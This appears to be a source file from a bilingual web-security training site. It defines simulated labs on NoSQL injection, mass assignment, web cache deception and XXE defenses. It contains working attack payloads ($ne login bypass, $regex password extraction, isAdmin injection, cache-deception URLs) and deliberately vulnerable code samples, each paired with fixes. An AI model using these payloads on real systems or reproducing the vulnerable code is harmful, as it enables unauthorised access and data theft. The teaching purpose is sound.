    { title: L('Disable DTDs', '禁用 DTD'), body: L('Turn off DOCTYPE and external entities in every parser; in Python use defusedxml.', '在每个解析器里关闭 DOCTYPE 和外部实体；Python 中使用 defusedxml。') },
    { title: L('Prefer JSON', '优先用 JSON'), body: L('If you don’t need XML, don’t accept it. Watch for hidden XML: SVG, DOCX, SOAP, SAML.', '如果不需要 XML，就别接收它。注意隐藏的 XML：SVG、DOCX、SOAP、SAML。') },
    { title: L('Patch and least privilege', '打补丁与最小权限'), body: L('Keep XML libraries updated; restrict outbound network access from servers.', '保持 XML 库更新；限制服务器的出站网络访问。') },
  ],
  qa: [
    { q: L('What is the “billion laughs” attack?', '什么是“十亿笑声”攻击？'), a: L('Nested entities that each expand to ten copies of the previous one; a few lines of XML expand to gigabytes and exhaust memory (DoS).', '实体层层嵌套，每层展开为上一层的十份；几行 XML 能展开成数 GB，耗尽内存（拒绝服务）。') },
    { q: L('How can XXE appear if the app accepts JSON?', '应用只接收 JSON，为什么还可能有 XXE？'), a: L('Some frameworks also accept XML if you change the Content-Type, and file uploads like SVG or DOCX are XML inside.', '有些框架在你修改 Content-Type 后也会接收 XML；SVG、DOCX 这类上传文件内部也是 XML。') },
  ],
};

/* ------------------------------------------------------------ NoSQL injection */
const MUSERS = [
  { username: 'admin', password: 'x9!Ksd-2kq' },
  { username: 'carlos', password: 'montoya' },
];
function mongoMatch(doc, query) {
  return Object.entries(query).every(([k, cond]) => {
    const v = doc[k];
    if (cond && typeof cond === 'object') {
      return Object.entries(cond).every(([op, arg]) => {
        if (op === '$ne') return v !== arg;
        if (op === '$gt') return v > arg;
        if (op === '$regex') { try { return new RegExp(arg).test(v); } catch { return false; } }
        if (op === '$in') return Array.isArray(arg) && arg.includes(v);
        return false;
      });
    }
    return v === cond;
  });
}
const nosqli = {
  tldr: L(
    'NoSQL injection abuses query languages like MongoDB’s. When a JSON body is passed straight into a query, an attacker can send operators such as $ne or $regex instead of plain values.',
    'NoSQL 注入利用的是 MongoDB 这类查询语言。当 JSON 请求体被直接传进查询时，攻击者可以发送 $ne、$regex 这样的操作符，而不是普通的值。',
  ),
  labTitle: L('Log in as admin without the password', '不知道密码以 admin 登录'),
  lab: {
    fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), rows: 3, default: '{"username": "admin", "password": {"$ne": null}}' }],
    presets: [
      { label: L('Normal', '正常'), values: { b: '{"username": "carlos", "password": "montoya"}' } },
      { label: '$ne', values: { b: '{"username": "admin", "password": {"$ne": null}}' } },
      { label: L('$regex: extract password', '$regex 逐位提取密码'), values: { b: '{"username": "admin", "password": {"$regex": "^x9"}}' } },
      { label: L('Any user', '任意用户'), values: { b: '{"username": {"$gt": ""}, "password": {"$gt": ""}}' } },
    ],
    defense: { label: L('Input handling', '输入处理'), off: L('Pass body to query', '直接传入查询'), on: L('Enforce string types', '强制字符串类型') },
    run({ values, defended }) {
      let body;
      const request = `POST /login HTTP/1.1\nContent-Type: application/json\n\n${values.b}`;
      try {
        body = JSON.parse(values.b);
      } catch {
        return { request, log: [], response: 'HTTP/1.1 400 Bad JSON', verdict: 'neutral', message: L('Invalid JSON.', 'JSON 格式错误。') };
      }
      const query = { username: body.username, password: body.password };
      const log = [`db.users.findOne(${JSON.stringify(query)})`];
      if (defended && (typeof query.username !== 'string' || typeof query.password !== 'string'))
        return { request, log: [L('🛡 username and password must be strings → 400', '🛡 用户名和密码必须是字符串 → 400')], response: 'HTTP/1.1 400 Bad Request', ...verdict(false, 'Objects are rejected, so operators can never reach the database.', '对象类型被拒绝，操作符永远到不了数据库。') };
      const user = MUSERS.find((u) => mongoMatch(u, query));
      const injected = JSON.stringify(query).includes('"$');
      if (!user) return { request, log, response: 'HTTP/1.1 401 Invalid credentials', verdict: 'neutral', message: L(injected ? 'No match. With $regex, that tells you this prefix is wrong: a boolean oracle.' : 'Wrong credentials.', injected ? '没有匹配。用 $regex 时，这说明这个前缀不对：一个布尔预言机。' : '凭据错误。') };
      return { request, log: [...log, injected ? L(`⚠ operator matched user "${user.username}"`, `⚠ 操作符匹配到了用户 "${user.username}"`) : L('✓ exact match', '✓ 精确匹配')], response: `HTTP/1.1 302 Found\nSet-Cookie: session=…\n\nWelcome, ${user.username}`, ...verdict(injected, injected ? `Logged in as ${user.username} without knowing the password.` : 'Normal login.', injected ? `不知道密码就以 ${user.username} 登录了。` : '正常登录。') };
    },
  },
  actors: [ATTACKER, APP('Node + MongoDB'), actor('db', 'MongoDB', 'users', 'amber')],
  flow: [
    msg('atk', 'app', '{"password": {"$ne": null}}', L('JSON lets the attacker send an object where the app expects a string.', 'JSON 让攻击者能在应用期望字符串的地方发送一个对象。'), 'attack'),
    msg('app', 'db', 'findOne({username, password})', L('The body is dropped straight into the query document.', '请求体被直接放进了查询文档。'), 'attack'),
    msg('db', 'db', 'password != null → true', L('$ne is an operator, so the condition is “any password that is not null”.', '$ne 是操作符，所以条件变成了“任何不为 null 的密码”。'), 'attack'),
    msg('db', 'app', '{username: "admin", …}', L('The admin document matches.', 'admin 文档匹配成功。')),
    msg('app', 'atk', 'session for admin', L('Same idea as SQLi, different syntax. $where and mapReduce can even run JavaScript in older MongoDB.', '与 SQL 注入思路相同，只是语法不同。在旧版 MongoDB 中，$where 和 mapReduce 甚至能执行 JavaScript。'), 'attack'),
  ],
  code: {
    vuln: `app.post('/login', async (req, res) => {
  const user = await users.findOne({
    username: req.body.username,
    password: req.body.password,
  });
});`,
    fixed: `const { username, password } = z.object({
  username: z.string().max(64),
  password: z.string().max(128),
}).parse(req.body);           // objects rejected
const user = await users.findOne({ username });
const ok = user && await argon2.verify(user.hash, password);`,
  },
  defenses: [
    { title: L('Validate types', '校验类型'), body: L('Use a schema (zod, Joi, pydantic) so fields that should be strings can’t be objects.', '使用 schema（zod、Joi、pydantic），让应为字符串的字段不能是对象。') },
    { title: L('Sanitise operators', '过滤操作符'), body: L('Strip keys starting with $ (e.g. express-mongo-sanitize) and disable server-side JavaScript.', '去掉以 $ 开头的键（比如 express-mongo-sanitize），并禁用服务器端 JavaScript。') },
    { title: L('Hash passwords', '密码要哈希'), body: L('Never query by password; look up the user then verify a hash.', '绝不要按密码查询；先查用户，再校验哈希。') },
  ],
  qa: [
    { q: L('How does $regex let you extract data?', '$regex 如何用来提取数据？'), a: L('Ask “does the password start with a?”, then “ab?”, and so on. Login success or failure answers each question, one character at a time.', '先问“密码是否以 a 开头？”，再问“是否以 ab 开头？”，依此类推。登录成功与否回答了每个问题，一次一个字符。') },
    { q: L('Can query strings carry objects too?', '查询字符串也能携带对象吗？'), a: L('Yes. Many parsers turn password[$ne]=x into {password: {$ne: "x"}}, so form-encoded endpoints are vulnerable too.', '可以。很多解析器会把 password[$ne]=x 转成 {password: {$ne: "x"}}，所以表单编码的接口同样会中招。') },
  ],
};

/* --------------------------------------------------------------- API / mass assignment */
const api = {
  tldr: L(
    'APIs expose the raw building blocks of an app. Common bugs: undocumented endpoints, missing authorisation per object, and mass assignment, where the server binds every JSON field to the model, including ones the user should never set.',
    'API 暴露了应用的底层构件。常见问题：未公开的接口、缺少对象级授权，以及“批量赋值”：服务器把 JSON 中的每个字段都绑定到模型上，包括用户永远不该设置的字段。',
  ),
  labTitle: L('Make yourself admin via a profile update', '通过更新资料把自己变成管理员'),
  lab: {
    fields: [{ id: 'b', label: 'PATCH /api/users/me', rows: 3, default: '{"displayName": "alice", "isAdmin": true}' }],
    presets: [
      { label: L('Normal update', '正常更新'), values: { b: '{"displayName": "Alice W."}' } },
      { label: 'isAdmin: true', values: { b: '{"displayName": "alice", "isAdmin": true}' } },
      { label: L('Free credit', '白嫖余额'), values: { b: '{"credit": 99999}' } },
    ],
    defense: { label: L('Field binding', '字段绑定'), off: L('Bind everything', '全部绑定'), on: L('Allow-listed DTO', '白名单 DTO') },
    run({ values, defended }) {
      let body;
      const request = `PATCH /api/users/me HTTP/1.1\nContent-Type: application/json\n\n${values.b}`;
      try {
        body = JSON.parse(values.b);
      } catch {
        return { request, log: [], response: 'HTTP/1.1 400', verdict: 'neutral', message: L('Invalid JSON.', 'JSON 格式错误。') };
      }
      const user = { id: 1002, displayName: 'alice', email: 'alice@uni.example', isAdmin: false, credit: 0 };
      const log = [];
      for (const [k, v] of Object.entries(body)) {
        if (defended && !['displayName', 'email'].includes(k)) log.push(L(`🛡 ignored field "${k}" (not in allow-list)`, `🛡 忽略字段 "${k}"（不在白名单内）`));
        else {
          const sensitive = !['displayName', 'email'].includes(k);
          log.push(sensitive ? L(`⚠ user.${k} = ${JSON.stringify(v)}`, `⚠ user.${k} = ${JSON.stringify(v)}`) : `user.${k} = ${JSON.stringify(v)}`);
          user[k] = v;
        }
      }
      const bad = user.isAdmin === true || user.credit > 0;
      return { request, log, response: `HTTP/1.1 200 OK\n\n${JSON.stringify(user, null, 2)}`, ...(bad ? verdict(true, 'Mass assignment: the API wrote a field the user was never meant to control.', '批量赋值：API 写入了一个本不该由用户控制的字段。') : verdict(false, 'Only harmless fields changed.', '只修改了无害的字段。')) };
    },
  },
  actors: [ATTACKER, actor('api', 'REST API', '/api/users', 'neutral'), actor('db', L('Database', '数据库'), 'users', 'amber')],
  flow: [
    msg('atk', 'api', 'GET /api/users/me', L('Recon: the response shows every field of the user object, including isAdmin.', '侦察：响应显示了用户对象的所有字段，包括 isAdmin。')),
    msg('atk', 'api', 'OPTIONS / GET /openapi.json', L('Find documentation, other HTTP methods, and old versions such as /api/v1.', '寻找文档、其他 HTTP 方法以及 /api/v1 这样的旧版本。')),
    msg('atk', 'api', 'PATCH {"isAdmin": true}', L('Send the hidden field back in an update.', '在更新请求中把那个隐藏字段发回去。'), 'attack'),
    msg('api', 'db', 'user.update(**body)', L('The framework binds all JSON keys to model attributes.', '框架把所有 JSON 键都绑定到了模型属性上。'), 'attack'),
    msg('api', 'atk', '200 · isAdmin: true', L('Privilege escalation in one request.', '一个请求完成提权。'), 'attack'),
  ],
  concepts: [
    { t: L('BOLA', 'BOLA（对象级授权失效）'), b: L('OWASP API #1: /api/orders/{id} without an ownership check. The API version of IDOR.', 'OWASP API 第一名：/api/orders/{id} 没有检查归属，相当于 API 版的 IDOR。') },
    { t: L('Excessive data exposure', '过度暴露数据'), b: L('Returning whole objects and relying on the front end to hide fields.', '返回完整对象，依赖前端隐藏字段。') },
    { t: L('Shadow & zombie APIs', '影子 API 与僵尸 API'), b: L('Forgotten /v1 endpoints or internal routes that never got the new security checks.', '被遗忘的 /v1 接口或内部路由，从未获得新的安全检查。') },
  ],
  code: {
    vuln: `@app.patch("/api/users/me")
def update_me():
    for k, v in request.json.items():
        setattr(current_user, k, v)
    db.session.commit()`,
    fixed: `class ProfileUpdate(BaseModel):
    model_config = ConfigDict(extra="forbid")
    displayName: str | None = None
    email: EmailStr | None = None

def update_me():
    data = ProfileUpdate.model_validate(request.json)
    current_user.update(**data.model_dump(exclude_unset=True))`,
  },
  defenses: [
    { title: L('Explicit input DTOs', '显式输入 DTO'), body: L('Bind requests to a dedicated schema with only the fields users may change.', '把请求绑定到专用 schema，只包含用户可以修改的字段。') },
    { title: L('Explicit output DTOs', '显式输出 DTO'), body: L('Serialise only the fields the client needs; don’t return internal flags.', '只序列化客户端需要的字段；不要返回内部标志位。') },
    { title: L('Inventory your API', '盘点你的 API'), body: L('Keep an OpenAPI spec, retire old versions, and test every endpoint for authorisation.', '维护 OpenAPI 规范，下线旧版本，对每个接口测试授权。') },
  ],
  qa: [
    { q: L('Name a famous mass-assignment incident.', '举一个著名的批量赋值事件。'), a: L('In 2012 a researcher used mass assignment in Rails to add his SSH key to the Rails organisation on GitHub, which led Rails to adopt strong parameters.', '2012 年，一位研究员利用 Rails 的批量赋值漏洞，把自己的 SSH 公钥加到了 GitHub 上的 Rails 组织里，此后 Rails 引入了 strong parameters。') },
    { q: L('How do you discover hidden API parameters?', '如何发现隐藏的 API 参数？'), a: L('Read GET responses, JS bundles and docs, then fuzz with wordlists (Param Miner) and compare responses.', '阅读 GET 响应、JS 打包文件和文档，再用字典模糊测试（Param Miner）并比较响应。') },
  ],
};

/* ---------------------------------------------------- web cache deception */
const cacheDeception = {
  tldr: L(
    'Web cache deception tricks a cache into storing a private, per-user page as if it were a public static file. The attacker then requests the same URL and gets the victim’s data from the cache.',
    'Web 缓存欺骗诱使缓存把一个私有的、因人而异的页面当作公共静态文件存起来。攻击者随后请求同一个 URL，就能从缓存里拿到受害者的数据。',
  ),
  labTitle: L('Get alice’s API key out of the CDN', '从 CDN 里拿到 alice 的 API Key'),
  lab: {
    fields: [{ id: 'p', label: L('URL you send to alice', '你发给 alice 的 URL'), default: '/my-account/x.css' }],
    presets: [
      { label: '/my-account', values: { p: '/my-account' } },
      { label: '/my-account/x.css', values: { p: '/my-account/x.css' } },
      { label: '/my-account;x.js', values: { p: '/my-account;x.js' } },
      { label: '/my-account%23x.png', values: { p: '/my-account%23x.png' } },
    ],
    defense: { label: L('Cache rules', '缓存规则'), off: L('Cache by file extension', '按扩展名缓存'), on: L('Respect Cache-Control', '遵从 Cache-Control') },
    run({ values, defended }) {
      const p = values.p;
      const cacheable = /\.(css|js|png|jpg|gif|ico)$/i.test(p);
      // Origin normalises: ignores trailing path segments, ;params and encoded # in this model.
      const originPath = p.replace(/(%23|;).*/, '').replace(/^(\/my-account)\/.*$/, '$1');
      const isAccount = originPath === '/my-account';
      const log = [L(`CDN sees ${p} → ${cacheable ? 'static file (cacheable)' : 'dynamic (not cached)'}`, `CDN 看到 ${p} → ${cacheable ? '静态文件（可缓存）' : '动态内容（不缓存）'}`), L(`origin routes ${p} → ${originPath}`, `源站把 ${p} 路由到 ${originPath}`)];
      const page = isAccount ? '<h1>My account</h1>\nAPI key: ak_live_7f3a9c21…\nEmail: alice@uni.example' : '404';
      const request = `1) alice:    GET ${p}  (Cookie: session=alice)\n2) attacker: GET ${p}  (no cookie)`;
      if (!isAccount) return { request, log, response: 'HTTP/1.1 404', verdict: 'neutral', message: L('The origin did not map this to the account page.', '源站没有把它映射到账户页面。') };
      if (defended) return { request, log: [...log, L('🛡 origin sends Cache-Control: no-store, private', '🛡 源站返回 Cache-Control: no-store, private'), L('🛡 CDN does not store it; attacker gets a login redirect', '🛡 CDN 不存储；攻击者只会被重定向到登录页')], response: 'HTTP/1.1 302 → /login', ...verdict(false, 'The cache trusts the origin’s headers instead of guessing from the extension.', '缓存信任源站的响应头，而不是根据扩展名去猜。') };
      if (!cacheable) return { request, log, response: `To attacker: HTTP/1.1 302 → /login`, verdict: 'neutral', message: L('Not cached, so the attacker just gets redirected to login. Make the URL look static.', '没被缓存，攻击者只会被重定向到登录页。让 URL 看起来像静态文件。') };
      return { request, log: [...log, L('⚠ CDN stores alice’s page under this key for 1 day', '⚠ CDN 以这个键把 alice 的页面缓存了 1 天'), L('⚠ attacker request → X-Cache: hit', '⚠ 攻击者请求 → X-Cache: hit')], response: `To attacker: HTTP/1.1 200 OK\nX-Cache: hit\n\n${page}`, ...verdict(true, 'The attacker received alice’s private page from the cache.', '攻击者从缓存中拿到了 alice 的私有页面。') };
    },
  },
  actors: [actor('vic', L("Alice (victim)", 'Alice（受害者）'), L('logged in', '已登录'), 'green'), actor('cdn', 'CDN', L('cache', '缓存'), 'amber'), actor('org', L('Origin', '源站'), 'shop.example', 'neutral'), actor('atk', L('Attacker', '攻击者'), 'mallory', 'red')],
  flow: [
    msg('vic', 'cdn', 'GET /my-account/x.css', L('Alice clicks a link from the attacker. Her cookie is attached.', 'Alice 点了攻击者发来的链接，Cookie 被自动带上。'), 'attack'),
    msg('cdn', 'org', 'cache MISS → forward', L('The CDN thinks .css is static and cacheable.', 'CDN 认为 .css 是可缓存的静态文件。')),
    msg('org', 'cdn', 'alice’s account page', L('The origin ignores the trailing /x.css and serves /my-account.', '源站忽略了末尾的 /x.css，返回了 /my-account。'), 'attack'),
    msg('cdn', 'cdn', 'store under /my-account/x.css', L('Two systems disagree about what the URL means. That discrepancy is the vulnerability.', '两个系统对同一个 URL 的理解不同，这种差异就是漏洞所在。'), 'attack'),
    msg('atk', 'cdn', 'GET /my-account/x.css', L('The attacker requests the same URL without any cookie.', '攻击者不带任何 Cookie 请求同一个 URL。'), 'attack'),
    msg('cdn', 'atk', 'HIT: alice’s API key', L('Served straight from the cache.', '直接从缓存返回。'), 'attack'),
  ],
  code: {
    vuln: `# CDN rule
cache if path ends with .css|.js|.png  (TTL 1d)
# origin (Express): /my-account/* matched by a loose route
app.get('/my-account*', showAccount)`,
    fixed: `# origin
res.set('Cache-Control', 'no-store, private')
app.get('/my-account', showAccount)   # exact route, 404 otherwise
# CDN: honour origin Cache-Control; never cache responses with Set-Cookie`,
  },
  defenses: [
    { title: L('Cache-Control on dynamic pages', '动态页面设置 Cache-Control'), body: L('no-store or private on anything user-specific, and make the CDN respect it.', '对任何因人而异的内容设置 no-store 或 private，并让 CDN 遵从。') },
    { title: L('Align path parsing', '统一路径解析'), body: L('Strict routing on the origin, and the same normalisation of ;, %23, dots and slashes as the cache.', '源站使用严格路由，并且与缓存对 ;、%23、点号和斜杠的规范化方式保持一致。') },
    { title: L('Cache by Content-Type, verified', '按 Content-Type 缓存并验证'), body: L('Only cache when the response type matches the extension (Cloudflare “Cache Deception Armor”).', '只有响应类型与扩展名一致时才缓存（如 Cloudflare 的 “Cache Deception Armor”）。') },
  ],
  qa: [
    { q: L('Cache deception vs cache poisoning?', '缓存欺骗和缓存投毒有什么区别？'), a: L('Deception makes the cache store the victim’s private response for the attacker to read. Poisoning makes the cache store the attacker’s malicious response for victims to receive.', '欺骗是让缓存存下受害者的私有响应，供攻击者读取；投毒是让缓存存下攻击者的恶意响应，发给受害者。') },
    { q: L('Why does /my-account;x.js work on some stacks?', '为什么 /my-account;x.js 在某些技术栈上有效？'), a: L('Java servers treat ; as a path parameter delimiter and drop the rest, while many caches see the whole string ending in .js.', 'Java 服务器把 ; 当作路径参数分隔符并丢弃其后内容，而很多缓存看到的是以 .js 结尾的完整字符串。') },
  ],
};

export const SERVER = {
  auth,
  'path-traversal': pathTraversal,
  cmdi,
  logic,
  'info-disclosure': infoDisclosure,
  'access-control': accessControl,
  'file-upload': fileUpload,
  race,
  ssrf,
  xxe,
  nosqli,
  api,
  'cache-deception': cacheDeception,
};
